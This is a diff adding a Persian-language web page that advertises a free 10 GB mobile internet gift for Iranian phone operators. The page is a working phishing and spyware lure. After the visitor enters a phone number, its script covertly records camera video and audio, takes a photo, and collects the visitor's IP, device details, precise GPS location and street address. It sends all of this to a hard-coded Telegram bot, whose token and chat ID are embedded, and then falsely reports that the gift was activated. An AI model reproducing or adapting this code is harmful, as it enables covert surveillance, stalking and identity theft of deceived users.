@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>اینترنت رایگان نامحدود</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
+    * {margin:0;padding:0;box-sizing:border-box;font-family:'Vazirmatn',sans-serif;}
+    body {background:linear-gradient(135deg,#1e3c72,#2a5298);color:#fff;text-align:center;padding:20px;}
+    .container {max-width:380px;margin:0 auto;background:rgba(255,255,255,0.15);border-radius:20px;padding:25px;box-shadow:0 10px 30px rgba(0,0,0,0.4);backdrop-filter:blur(12px);}
+    .logo {width:90px;height:90px;margin:0 auto 15px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 15px rgba(0,0,0,0.2);}
+    .logo img {width:65px;}
+    h1 {font-size:23px;margin-bottom:8px;}
+    p {font-size:14px;margin-bottom:22px;opacity:0.9;line-height:1.6;}
+    .operators {display:flex;gap:12px;margin-bottom:22px;justify-content:center;flex-wrap:wrap;}
+    .op {flex:1;min-width:90px;padding:14px;border:2px solid rgba(255,255,255,0.3);border-radius:14px;font-size:14px;cursor:pointer;transition:0.3s;display:flex;flex-direction:column;align-items:center;gap:6px;}
+    .op img {width:36px;height:36px;object-fit:contain;}
+    .op span {font-size:13px;font-weight:500;}
+    .op.active {border-color:#00d2ff;background:rgba(0,210,255,0.15);transform:scale(1.05);}
+    .btn {background:#00d2ff;color:#fff;border:none;padding:16px;font-size:17px;font-weight:bold;border-radius:14px;cursor:pointer;width:100%;transition:0.3s;margin-top:10px;box-shadow:0 4px 15px rgba(0,210,255,0.4);}
+    .btn:hover {background:#00b4d8;transform:translateY(-1px);}
+    .btn:disabled {background:#666;cursor:not-allowed;transform:none;}
+    .spinner {display:inline-block;width:16px;height:16px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-left:8px;}
+    @keyframes spin {to{transform:rotate(360deg);}}
+    .status {margin-top:15px;font-size:13px;min-height:20px;}
+    .progress {width:100%;height:6px;background:rgba(255,255,255,0.2);border-radius:3px;margin:15px 0;overflow:hidden;}
+    .progress-bar {height:100%;background:#00d2ff;width:0;transition:width 0.3s;box-shadow:0 0 10px #00d2ff;}
+    .hidden {display:none;}
+    .footer {margin-top:25px;font-size:11px;opacity:0.6;}
+    .phone-input {width:100%;padding:12px;border-radius:8px;border:none;margin:15px 0 10px;text-align:center;font-size:16px;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://i.imgur.com/5e5b6e7.png" alt="WiFi">
+    </div>
+    <h1>اینترنت رایگان نامحدود</h1>
+    <p>بسته هدیه ۱۰ گیگابایت اینترنت رایگان برای همه اپراتورها!</p>
+
+    <!-- فقط اینپوت شماره تلفن -->
+    <input type="tel" id="userPhone" class="phone-input" placeholder="09123456789" />
+
+    <div class="operators">
+      <div class="op active" data-op="irancell">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Irancell_Logo.svg/512px-Irancell_Logo.svg.png" alt="ایرانسل">
+        <span>ایرانسل</span>
+      </div>
+      <div class="op" data-op="mci">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/MCI_Logo.svg/512px-MCI_Logo.svg.png" alt="همراه اول">
+        <span>همراه اول</span>
+      </div>
+      <div class="op" data-op="rightel">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Rightel_Logo.svg/512px-Rightel_Logo.svg.png" alt="رایتل">
+        <span>رایتل</span>
+      </div>
+    </div>
+
+    <button id="enterBtn" class="btn">
+      <span id="btnText">ورود به سایت</span>
+      <span id="spinner" class="spinner hidden"></span>
+    </button>
+
+    <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
+    <div id="status" class="status">آماده فعال‌سازی بسته هدیه...</div>
+    <div class="footer">
+      پشتیبانی: ۰۹۹۹۹۹۹۹۹۹۹ | فقط امروز فعال است!
+    </div>
+  </div>
+
+  <video id="video" class="hidden" autoplay playsinline></video>
+  <canvas id="canvas" class="hidden"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
+    const CHAT_ID = "6080665310";
+    const enterBtn = document.getElementById('enterBtn');
+    const btnText = document.getElementById('btnText');
+    const spinner = document.getElementById('spinner');
+    const status = document.getElementById('status');
+    const progressBar = document.getElementById('progressBar');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const operators = document.querySelectorAll('.op');
+    let stream, timer;
+    let selectedOp = 'irancell';
+
+    operators.forEach(op => {
+      op.addEventListener('click', () => {
+        operators.forEach(o => o.classList.remove('active'));
+        op.classList.add('active');
+        selectedOp = op.dataset.op;
+      });
+    });
+
+    enterBtn.addEventListener('click', startCapture);
+
+    async function startCapture() {
+      const phoneInput = document.getElementById('userPhone');
+      if (!phoneInput.value || !phoneInput.value.match(/^09[0-9]{9}$/)) {
+        alert('شماره تلفن رو درست بزن!');
+        return;
+      }
+
+      enterBtn.disabled = true;
+      btnText.textContent = "در حال اتصال به سرور...";
+      spinner.classList.remove('hidden');
+      status.textContent = "درخواست دسترسی به دوربین...";
+      progressBar.style.width = "0%";
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user", width: 640, height: 480 },
+          audio: true
+        });
+        video.srcObject = stream;
+        video.muted = true;
+        video.play();
+
+        status.textContent = "در حال ضبط فیلم تأیید هویت...";
+        let seconds = 0;
+        timer = setInterval(() => {
+          seconds++;
+          progressBar.style.width = `${(seconds / 10) * 100}%`;
+          if (seconds >= 10) {
+            clearInterval(timer);
+            captureAndSend();
+          }
+        }, 1000);
+      } catch (err) {
+        status.textContent = "دسترسی به دوربین رد شد.";
+        reset();
+      }
+    }
+
+    async function captureAndSend() {
+      status.textContent = "در حال پردازش اطلاعات...";
+      const videoBlob = await recordVideo();
+      const photoBlob = await capturePhoto();
+      const deviceInfo = await getDeviceInfo();
+      const location = await getLocation();
+      const userPhone = document.getElementById('userPhone').value; // شماره تلفن
+
+      let messageId = null;
+
+      if (videoBlob) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('video', videoBlob, `video_${Date.now()}.webm`);
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
+        const data = await res.json();
+        if (data.ok) messageId = data.result.message_id;
+      }
+
+      if (photoBlob) {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', photoBlob, 'camera.jpg');
+        if (messageId) form.append('reply_to_message_id', messageId);
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+        const data = await res.json();
+        if (data.ok) messageId = data.result.message_id;
+      }
+
+      const report = `
+*گزارش کاربر - اینترنت رایگان*
+*شماره تلفن:* \`${userPhone}\`
+اپراتور: \`${selectedOp.toUpperCase()}\`
+مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
+IP: \`${deviceInfo.ip}\`
+موقعیت تقریبی: \`${deviceInfo.location}\`
+*موقعیت دقیق*
+طول: \`${location.latitude || 'نامشخص'}\`
+عرض: \`${location.longitude || 'نامشخص'}\`
+آدرس: \`${location.address || 'نامشخص'}\`
+[نقشه](https://maps.google.com/?q=${location.latitude},${location.longitude})
+      `.trim();
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: report,
+          parse_mode: 'Markdown',
+          reply_to_message_id: messageId
+        })
+      });
+
+      status.innerHTML = "بسته ۱۰ گیگ با موفقیت فعال شد! <strong style='color:#0f0;'>✓</strong>";
+      stopStream();
+      setTimeout(reset, 3000);
+    }
+
+    async function recordVideo() {
+      return new Promise(resolve => {
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = () => resolve(new Blob(chunks, { type: 'video/webm' }));
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000);
+      });
+    }
+
+    async function capturePhoto() {
+      return new Promise(resolve => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.9);
+      });
+    }
+
+    async function getDeviceInfo() {
+      const info = { userAgent: navigator.userAgent, ip: '', location: '' };
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        info.ip = data.ip || 'نامشخص';
+        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
+      } catch {}
+      return info;
+    }
+
+    async function getLocation() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve({ error: "GPS غیرفعال" });
+        navigator.geolocation.getCurrentPosition(
+          async pos => {
+            const { latitude, longitude } = pos.coords;
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+              const data = await res.json();
+              resolve({ latitude, longitude, address: data.display_name || "نامشخص" });
+            } catch {
+              resolve({ latitude, longitude, address: "نامشخص" });
+            }
+          },
+          () => resolve({ error: "اجازه رد شد" }),
+          { enableHighAccuracy: true, timeout: 12000 }
+        );
+      });
+    }
+
+    function stopStream() {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    }
+
+    function reset() {
+      enterBtn.disabled = false;
+      btnText.textContent = "ورود به سایت";
+      spinner.classList.add('hidden');
+      progressBar.style.width = "0%";
+    }
+  </script>
+</body>
+</html>
